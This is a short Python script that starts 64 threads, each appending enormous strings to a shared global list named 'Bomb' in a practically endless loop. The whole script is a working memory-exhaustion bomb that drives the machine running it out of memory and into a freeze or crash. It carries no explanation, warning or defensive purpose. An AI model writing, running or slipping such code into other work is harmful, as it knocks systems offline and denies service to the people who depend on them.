from threading import Thread

Bomb = []

def Add_Data():
    for i in range(10000000000000000000000000000):
        Bomb.append(str(i)*1000000)

for i in range(64):
    t = Thread(target=Add_Data)
    t.start()
